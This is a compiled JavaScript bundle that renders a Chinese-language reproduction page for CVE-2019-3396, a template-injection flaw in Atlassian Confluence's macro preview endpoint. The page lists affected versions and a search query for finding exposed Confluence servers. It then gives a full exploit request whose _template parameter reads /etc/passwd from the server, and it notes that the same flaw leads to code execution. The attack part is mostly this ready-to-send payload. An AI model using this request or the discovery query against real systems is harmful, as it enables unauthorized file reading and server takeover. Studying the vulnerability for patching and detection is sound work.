(window.webpackJsonp=window.webpackJsonp||[]).push([[421],{1725:function(t,s,a){t.exports=a.p+"assets/img/1630488806824-a8205673-933b-434b-8050-abcde3ef3e97.d63dc073.png"},2497:function(t,s,a){"use strict";a.r(s);var n=a(75),e=Object(n.a)({},(function(){var t=this,s=t.$createElement,n=t._self._c||s;return n("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[n("h1",{attrs:{id:"atlassian-confluence-preview-ssti模版注入漏洞-cve-2019-3396"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#atlassian-confluence-preview-ssti模版注入漏洞-cve-2019-3396"}},[t._v("#")]),t._v(" Atlassian Confluence preview SSTI模版注入漏洞 CVE-2019-3396")]),t._v(" "),n("h2",{attrs:{id:"漏洞描述"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),n("p",[t._v("Confluence是一个专业的企业知识管理与协同软件，常用于构建企业wiki。 利用该漏洞可以读取服务器上任意文件，进而可以包含恶意文件来执行代码。可能造成敏感信息泄露，服务器被控制等严重后果。")]),t._v(" "),n("h2",{attrs:{id:"漏洞影响"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),n("a-checkbox",{attrs:{checked:""}},[t._v("Atlassian Atlassian Confluence < 6.6.12")]),n("br"),t._v(" "),n("a-checkbox",{attrs:{checked:""}},[t._v("Atlassian Atlassian Confluence 6.7.0-6.12.2")]),n("br"),t._v(" "),n("a-checkbox",{attrs:{checked:""}},[t._v("Atlassian Atlassian Confluence < 6.13.3")]),n("br"),t._v(" "),n("a-checkbox",{attrs:{checked:""}},[t._v("Atlassian Atlassian Confluence < 6.14.2")]),n("br"),t._v(" "),n("h2",{attrs:{id:"网络测绘"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[t._v("#")]),t._v(" 网络测绘")]),t._v(" "),n("a-checkbox",{attrs:{checked:""}},[t._v('app="ATLASSIAN-Confluence"')]),n("br"),t._v(" "),n("h2",{attrs:{id:"漏洞复现"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),n("p",[t._v("登录页面")]),t._v(" "),n("p",[n("img",{attrs:{src:a(1725),alt:"img"}})]),t._v(" "),n("p",[t._v("发送请求包")]),t._v(" "),n("div",{staticClass:"language-php line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-php"}},[n("code",[n("span",{pre:!0,attrs:{class:"token constant"}},[t._v("POST")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("rest"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("tinymce"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("macro"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("preview "),n("span",{pre:!0,attrs:{class:"token constant"}},[t._v("HTTP")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1.1")]),t._v("\nHost"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" \nConnection"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" close\nUser"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Agent"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" Mozilla"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("5.0")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("Macintosh"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" Intel Mac "),n("span",{pre:!0,attrs:{class:"token constant"}},[t._v("OS")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token constant"}},[t._v("X")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("10_13_6")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" AppleWebKit"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("537.36")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token constant"}},[t._v("KHTML")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" like Gecko"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" Chrome"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("73.0")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v(".3670")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v(".0")]),t._v(" Safari"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("537.36")]),t._v("\nContent"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Type"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" application"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("json"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" charset"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("utf"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("8")]),t._v("\nContent"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Length"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("168")]),t._v("\n\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"contentId"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"786457"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"macro"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"name"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"widget"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"body"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('""')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"params"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"url"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"https://www.viddler.com/v/23464dc5"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"width"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"1000"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"height"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"1000"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"_template"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"file:///etc/passwd"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br"),n("span",{staticClass:"line-number"},[t._v("7")]),n("br"),n("span",{staticClass:"line-number"},[t._v("8")]),n("br")])])],1)}),[],!1,null,null,null);s.default=e.exports}}]);